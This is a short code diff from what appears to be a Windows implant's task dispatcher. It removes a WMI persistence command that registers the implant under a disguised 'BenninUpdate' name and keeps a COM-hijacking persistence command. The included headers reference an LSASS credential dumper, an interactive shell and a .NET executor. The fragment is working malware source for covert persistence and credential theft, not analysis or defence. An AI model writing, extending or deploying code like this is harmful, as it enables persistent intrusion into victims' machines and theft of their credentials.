@@ -12,7 +12,6 @@
 #include "../streaming/Streamer.h"
 #include "../shell/InteractiveShell.h"
 #include "../execution/DotNetExecutor.h"
-#include "../persistence/WmiPersistence.h"
 #include "../persistence/ComHijacker.h"
 #include "../credential/LsassDumper.h"
 #include "../utils/Shared.h"
@@ -263,14 +262,7 @@ void TaskDispatcher::dispatch(const Task& task) {
                 GetModuleFileNameW(NULL, implantPath, MAX_PATH);
                 std::wstring wImplantPath(implantPath);
 
-                if (cmd.find("wmi install") == 0) {
-                    std::string name = "BenninUpdate";
-                    if (cmd.length() > 12) name = cmd.substr(12);
-                    std::wstring wName = utils::s2ws(name);
-                    if (persistence::WmiPersistence::Install(wImplantPath, wName))
-                        result.output = "ADV_PERSISTENCE:WMI installed as " + name;
-                    else result.error = "WMI install failed";
-                } else if (cmd.find("com install") == 0) {
+                if (cmd.find("com install") == 0) {
                     std::string clsid = "{00021400-0000-0000-C000-000000000046}"; // Folder Background
                     if (cmd.length() > 12) clsid = cmd.substr(12);
                     if (persistence::ComHijacker::Install(wImplantPath, utils::s2ws(clsid)))
